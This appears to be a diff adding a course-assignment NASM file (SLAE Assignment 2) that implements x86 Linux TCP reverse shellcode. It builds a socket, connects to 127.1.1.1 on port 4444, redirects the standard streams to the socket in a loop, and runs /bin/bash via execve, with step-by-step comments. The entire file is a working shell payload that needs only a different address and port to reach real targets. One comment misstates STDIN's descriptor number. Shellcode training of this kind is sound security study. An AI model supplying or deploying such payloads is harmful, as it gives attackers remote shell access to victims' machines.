@@ -1,0 +1,96 @@
+; File: reverse_shellcode.nasm
+; Author: Kunal Pachauri
+; Purpose: To create a TCP Reverse Shellcode that connects back to Attacker and spawns a shell
+; SLAE-9237 : Assignment 2
+
+
+global _start	; Making Entry Point accessible
+
+section .text
+_start: 	; Entry Point
+
+; Create Socket
+	; int socketcall(int call, unsigned long *args);
+	; SYSCALL number for socketcall -> 102 -> EAX
+	; Constant for SYS_SOCKET -> 1 -> EBX
+	
+	; int socket(int domain, int type, int protocol);
+	; Pushing in reverse order
+	xor ebx, ebx	; Zeroing EBX
+	mul ebx		; Zeroing EAX
+	push ebx	; Pushing protocol -> IPPROTO_IP -> 0
+	push byte 1	; Pushing type -> SOCK_STREAM -> 1
+	push byte 2	; Pushing domain -> AF_INET -> 2 
+
+	; Preparing Registers for SYSCALL
+	mov al, 102
+	mov bl, 1
+	mov ecx, esp
+
+	; Performing SYSCALL and storing Socket File Descriptor in EDI
+	int 0x80
+	mov edi, eax
+
+; Connect to Attacker's IP and Port
+	; int socketcall(int call, unsigned long *args);
+	; SYSCALL number for socketcall -> 102 -> EAX
+	; Constant for SYS_CONNECT -> 3 -> EBX
+	
+	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+	; Defining Socket Structure sockaddr
+	push 0x0101017f		; sin_addr -> 127.1.1.1 -> To Prevent NULL -> In Little Endian
+	push word 0x5c11	; sin_port -> 4444 -> In Little Endian
+	push word 2		; sin_family -> AF_INET -> 2
+
+	; Storing Address of Socket Structure in EDX temporarily
+	mov edx, esp
+
+	; Pushing Arguments in Reverse order
+	push byte 16		; addrlen -> 16 -> Size of Socket Structure (8+4+4)
+	push edx		; Address of sockaddr
+	push edi		; Socket File Descriptor obtained from step 1
+
+	; Preparing Registers to perform SYSCALL
+	xor eax, eax		; Zeroing EAX
+	mov al, 102		; Storing syscall of socketcall in EAX
+	mov bl, 3		; Constant value of SYS_CONNECT
+	mov ecx, esp		; Address in memory having arguments
+
+	int 0x80		; Performing SYSCALL
+
+; Redirect STDIN, STDOUT, STDERR to created socket
+	; int dup2(int oldfd, int newfd); duplicates a file descriptor
+	; We have stored sockfd in EDI from step 1
+	; constant values for STDERR -> 2, STDOUT -> 1, STDIN -> 1
+	mov ebx, edi		; Storing Socket File Descriptor in EBX as it is the First Argument
+	xor ecx, ecx		; Zeroing ECX
+	mov cl, 2		; Initial Loop value, will iterate as 2,1,0
+
+	redirect:	; Looping to Duplicate all three streams
+		;Pushing syscall of dup2 in EAX
+		xor eax, eax
+		mov al, 63
+		; EBX already contains clientfd
+		int 0x80
+		dec ecx
+		; Jump short if not signed
+		jns redirect	
+
+; Spawn Shell using EXECVE
+	; SYSCALL for Execve is 11
+	; execve("/bin/bash", NULL, NULL);
+	; Pushing  null first
+	xor eax, eax
+	push eax
+	
+	; Pushing /bin////bash in reverse order
+	push 0x68736162
+	push 0x2f2f2f2f
+	push 0x6e69622f
+
+	; Setting up registers to perform syscall
+	mov ebx, esp
+	mov ecx, eax
+	mov edx, eax
+	mov al, 11
+	int 0x80
